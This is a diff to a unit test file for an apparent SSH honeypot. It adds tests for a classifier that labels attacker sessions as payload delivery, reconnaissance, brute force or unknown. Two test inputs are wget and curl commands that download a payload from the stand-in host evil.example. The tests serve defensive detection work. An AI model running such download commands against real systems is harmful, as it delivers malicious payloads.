@@ -7,6 +7,7 @@ os.chdir(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import honeypot
 from fake_filesystem import FAKE_FS, FILE_CONTENTS
+from profiles import classify
 
 
 class FakeServer:
@@ -53,6 +54,24 @@ class EmulateCommandTests(unittest.TestCase):
 
     def test_empty_input_returns_empty_string(self):
         self.assertEqual(honeypot.emulate_command("", FakeServer()), "")
+
+
+class ClassifyTests(unittest.TestCase):
+
+    def test_a_wget_command_with_arguments_is_payload_delivery(self):
+        self.assertEqual(classify(["wget http://evil.example/payload -O out"]), "payload_delivery")
+
+    def test_a_curl_command_with_arguments_is_payload_delivery(self):
+        self.assertEqual(classify(["curl -o out http://evil.example/payload"]), "payload_delivery")
+
+    def test_whoami_alone_is_reconnaissance(self):
+        self.assertEqual(classify(["whoami"]), "reconnaissance")
+
+    def test_over_ten_commands_is_bruteforce_or_automation(self):
+        self.assertEqual(classify(["ls"] * 11), "bruteforce_or_automation")
+
+    def test_an_ordinary_short_session_is_unknown(self):
+        self.assertEqual(classify(["ls", "pwd"]), "unknown")
 
 
 if __name__ == "__main__":
